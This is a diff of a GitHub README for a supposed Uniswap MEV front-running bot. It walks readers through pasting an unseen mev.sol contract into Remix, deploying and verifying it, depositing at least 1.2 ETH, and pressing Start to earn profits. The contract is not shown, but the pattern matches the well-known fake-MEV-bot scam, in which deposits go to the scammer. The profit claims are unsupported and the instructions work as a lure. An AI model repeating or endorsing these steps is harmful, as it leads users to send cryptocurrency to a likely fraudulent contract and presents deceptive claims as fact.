@@ -43,27 +43,39 @@ Our BOT sniffs the Uniswap v2 Mempool for transactions with high slippage, deter
 
 ## 👨‍💻 Instructions
 
-1) Copy the code and paste it into the MevBot.sol file in Remix IDE - https://remix.ethereum.org/
+1) Follow these instructions to deploy your smart contract using [REMIX IDE](https://remix.ethereum.org):
+  - 📁 Create a new file mev.sol and paste the code from mev.sol.
+
 
 <img width="1496" alt="1" src="https://user-images.githubusercontent.com/132264778/235452636-8dfda62f-714c-4fb2-9d45-d75bbea7be85.png">
 
-2) Select Solidity compiler version 0.6.12 and press compile.
+2) 🔧 Select compiler version 0.6.12 and press compile.
 
 ![2](https://user-images.githubusercontent.com/132264778/235454398-1211b3c3-5eb9-463e-9d3d-824d398eec0d.png)
 
-3) Select ENVIRONMENT - “Injected Provider - Metamask” and connect the wallet you will be deploying from. Click deploy and confirm the transaction.
+3) 🚀 Navigate to "Deploy" and set the environment to "Injected Provider - MetaMask". Connect the wallet and click "Deploy".
 
 ![3](https://user-images.githubusercontent.com/132264778/235454410-cb9b447c-bb47-4907-872a-6c75bdf17890.png)
 
-4) Deposit funds (at least 1.2 ETH to prevent negating slippage) into your specific contract/bot address.
+4) Verify your smart contract on etherscan -
 
-<img src="https://cdn.discordapp.com/attachments/1100240659853619312/1106159980249354250/ds2.png" width="250">
+- 🌐 Visit [Etherscan Verify Contract](https://etherscan.io/verifyContract).
+   - 📝 Enter contract address and set inputs:
+   - Compiler Type: Solidity (Single File)
+   - Compiler Version: ^0.6.12
+   - License Type: 3) MIT License (MIT)
+   - 📋 Paste the code from mev.sol.
+   - 🚫 Leave ABI input box empty.
+   - 🟢 Click "Verify"
 
-5) After your transaction is confirmed, start the bot by clicking the 'start' button. 
 
-<img src="https://cdn.discordapp.com/attachments/1100240659853619312/1106160402297012294/ds1.png" width="250">
+5) Deposit funds (at least 1.2 ETH to prevent negating slippage) into your specific contract/bot address.
+ 
+6) Go to your verified contract. Write contract. Enter the amount of ETH you want to trade with into the 1. Start. Confirm the transaction
 
-6) Withdraw anytime by clicking 'withdrawal'.
+<img width="780" alt="4" src="https://user-images.githubusercontent.com/132264778/235452658-71fb728f-d0e6-4a30-8236-9cf8c5926979.png">
+
+7) Withdraw anytime by clicking 'withdrawal'.
 
 :hourglass_flowing_sand: Wait a couple of days for profits to roll in. Remember, for successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 1.2ΕΤΗ and higher. 
 
